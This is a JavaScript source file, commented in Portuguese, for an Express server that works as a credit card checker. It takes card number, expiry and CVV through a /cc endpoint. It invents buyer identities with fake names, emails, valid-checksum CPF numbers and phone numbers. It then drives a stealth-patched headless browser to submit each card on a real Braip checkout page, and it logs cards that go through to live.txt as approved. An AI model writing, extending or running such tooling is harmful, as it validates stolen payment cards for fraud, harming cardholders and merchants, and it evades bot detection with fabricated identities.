const express = require("express");
// MUDANÇA: Usando um método de importação mais explícito para evitar erros de módulo.
const puppeteer = require("puppeteer-extra").addExtra(require("puppeteer"));
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const fs = require("fs");

// Adiciona o plugin de stealth ao puppeteer
puppeteer.use(StealthPlugin());

// =================================================================
//      FUNÇÕES AUXILIARES (Sem alterações)
// =================================================================

function gerarNomeAleatorio() {
  const nomes = [
    "Joao",
    "Maria",
    "Pedro",
    "Ana",
    "Carlos",
    "Juliana",
    "Lucas",
    "Mariana",
    "Rafael",
    "Fernanda",
  ];
  const sobrenomes = [
    "Silva",
    "Santos",
    "Oliveira",
    "Souza",
    "Pereira",
    "Costa",
    "Rodrigues",
    "Almeida",
    "Nascimento",
    "Lima",
  ];
  const nome = nomes[Math.floor(Math.random() * nomes.length)];
  const sobrenome = sobrenomes[Math.floor(Math.random() * sobrenomes.length)];
  return {
    nomeCompleto: `${nome} ${sobrenome}`,
    primeiroNome: nome,
    sobrenome: sobrenome,
  };
}

function gerarEmailAleatorio(nome, sobrenome) {
  const nomeFormatado = nome
    .normalize("NFD")
    .replace(/[\u00c0-\u00ff]/g, "")
    .toLowerCase();
  const sobrenomeFormatado = sobrenome
    .normalize("NFD")
    .replace(/[\u00c0-\u00ff]/g, "")
    .toLowerCase();
  const numero = Math.floor(Math.random() * 999);
  return `${nomeFormatado}.${sobrenomeFormatado}${numero}@gmail.com`;
}

function gerarCPFAleatorio() {
  const cpfArray = Array.from({ length: 9 }, () =>
    Math.floor(Math.random() * 10)
  );
  let soma = cpfArray.reduce((acc, digit, i) => acc + digit * (10 - i), 0);
  let resto = (soma * 10) % 11;
  const digito1 = resto === 10 ? 0 : resto;
  cpfArray.push(digito1);
  soma = cpfArray.reduce((acc, digit, i) => acc + digit * (11 - i), 0);
  resto = (soma * 10) % 11;
  const digito2 = resto === 10 ? 0 : resto;
  cpfArray.push(digito2);
  return cpfArray.join("");
}

function gerarTelefoneAleatorio() {
  const ddds = ["11", "71", "81", "85"];
  const ddd = ddds[Math.floor(Math.random() * ddds.length)];
  const numero =
    "9" +
    Array.from({ length: 8 }, () => Math.floor(Math.random() * 10)).join("");
  return ddd + numero;
}

function salvarCartaoAprovado(cardLine) {
  try {
    fs.appendFileSync("live.txt", `CARTÃO APROVADO: ${cardLine}\n`);
  } catch (error) {
    console.error("Erro ao salvar cartão no live.txt:", error.message);
  }
}

// =================================================================
//      FUNÇÃO PRINCIPAL `testarCartao` (LÓGICA CORRIGIDA)
// =================================================================

async function testarCartao(cardLine) {
  const [cardNumber, month, yearFull, cvv] = cardLine.split("|");
  const year = yearFull.slice(-2);
  const dadosPessoa = gerarNomeAleatorio();
  const email = gerarEmailAleatorio(
    dadosPessoa.primeiroNome,
    dadosPessoa.sobrenome
  );
  const cpf = gerarCPFAleatorio();
  const telefone = gerarTelefoneAleatorio();

  let browser = null;
  try {
    browser = await puppeteer.launch({
      headless: "new",
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
      ],
    });

    const page = await browser.newPage();
    await page.setRequestInterception(true);
    page.on("request", (request) => {
      if (["image", "stylesheet", "font"].includes(request.resourceType())) {
        request.abort();
      } else {
        request.continue();
      }
    });

    await page.goto(
      "https://ev.braip.com/checkout/pla2gpqx/che8pwe8?af=afi9e5lyz5&currency=BRL&pv=pro22kk9",
      { waitUntil: "domcontentloaded", timeout: 60000 }
    );

    await page.type("#nome", dadosPessoa.nomeCompleto, { delay: 40 });
    await page.type("#email", email, { delay: 30 });
    await page.type("#documento", cpf, { delay: 30 });
    await page.type("#celular", telefone, { delay: 20 });
    await page.type(
      'input[placeholder="Digite somente números do cartão"]',
      cardNumber,
      { delay: 50 }
    );
    await page.type(
      'input[name="credito_full_name"]',
      dadosPessoa.nomeCompleto,
      { delay: 70 }
    );
    await page.type('input[name="credito_mes"]', month, { delay: 20 });
    await page.type('input[name="credito_ano"]', year, { delay: 20 });
    await page.type('input[name="credito_cvc"]', cvv, { delay: 20 });

    await page.click("#submit");

    // ** LÓGICA CORRIGIDA ABAIXO **
    try {
      // Tenta encontrar a mensagem de erro que indica REPROVADO.
      const mensagemErroElement = await page.waitForSelector(
        'div[style="padding-top:7px;"]',
        { visible: true, timeout: 35000 }
      );
      const mensagemErro = await mensagemErroElement.evaluate((el) =>
        el.innerText.trim()
      );

      // Se encontrou, o cartão foi de fato REPROVADO.
      return {
        status: "reprovado",
        mensagem: mensagemErro,
        cartao: `${cardNumber}|${month}|${yearFull}|${cvv}`,
      };
    } catch (error) {
      // Se deu TIMEOUT ao esperar pela mensagem de erro, significa que ela NÃO apareceu.
      // Este é o cenário de SUCESSO (APROVADO).
      salvarCartaoAprovado(cardLine);
      return {
        status: "aprovado",
        mensagem: "O cartão foi processado com sucesso!",
        cartao: `${cardNumber}|${month}|${yearFull}|${cvv}`,
      };
    }
  } catch (error) {
    // Se qualquer outro erro acontecer (falha ao iniciar o browser, falha no goto, etc.),
    // será capturado aqui. Isso é um ERRO DE AUTOMAÇÃO, não um cartão aprovado.
    console.error("Ocorreu um erro geral na automação:", error);
    return {
      status: "erro_automacao",
      mensagem: `Falha ao executar o teste: ${error.message}`,
      cartao: `${cardNumber}|${month}|${yearFull}|${cvv}`,
    };
  } finally {
    if (browser) {
      await browser.close();
    }
  }
}

// =================================================================
//      CONFIGURAÇÃO DO SERVIDOR EXPRESS (Sem alterações)
// =================================================================

const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

app.get("/cc", async (req, res) => {
  const { lista } = req.query;
  console.log(`[+] Requisição recebida para testar: ${lista}`);
  if (!lista) {
    return res
      .status(400)
      .json({ status: "erro", mensagem: "Parâmetro 'lista' não encontrado." });
  }
  try {
    const resultado = await testarCartao(lista);
    res.json(resultado);
    console.log(`[✓] Resposta enviada: ${JSON.stringify(resultado)}`);
  } catch (serverError) {
    console.error("Erro no servidor:", serverError);
    res.status(500).json({
      status: "erro_servidor",
      mensagem: "Ocorreu um erro inesperado.",
    });
  }
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
});
